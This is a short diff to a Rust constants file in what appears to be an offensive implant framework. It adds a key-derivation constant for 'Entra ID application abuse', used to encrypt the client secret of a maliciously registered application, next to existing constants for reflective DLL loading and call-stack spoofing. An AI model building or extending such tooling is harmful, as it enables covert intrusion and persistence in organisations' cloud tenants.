@@ -81,9 +81,16 @@ pub const ADAPTIVE_TIMING: &[u8] =
 /// Reflective DLL loader — domain separation for the per-load randomised
 /// section name and cookie values used by NtCreateSection-based reflective
 /// loading.  Ensures the loader's randomisation is distinct from any other
-/// derived key.  The next available first-byte index is \x11.
+/// derived key.
 pub const REFLECTIVE_LOADER: &[u8] =
     b"\x10\xb4\x7e\xf3\x92\xc5\x0d\xa8\x61\x3b\xd6\x4e\x8f\x2a\x17\xc9";
+
+/// Entra ID application abuse — domain separation for XOR-encrypting the
+/// client secret value of a maliciously registered application.  The secret
+/// is never stored in plaintext; it is encrypted with a key derived via
+/// HKDF-SHA256 from the agent's session key using this info constant.
+pub const ENTRA_APP_SECRET: &[u8] =
+    b"\x11\x3a\xd7\x4f\x88\xc1\x2e\xb5\x56\x90\x0d\xf3\xe4\x7a\x1c\x5b";
 
 /// Collect all info slices into a single array for uniqueness tests.
 #[cfg(test)]
@@ -105,6 +112,7 @@ fn all_infos() -> Vec<&'static [u8]> {
         TRAMPOLINE_SPOOF,
         ADAPTIVE_TIMING,
         REFLECTIVE_LOADER,
+        ENTRA_APP_SECRET,
     ]
 }
 
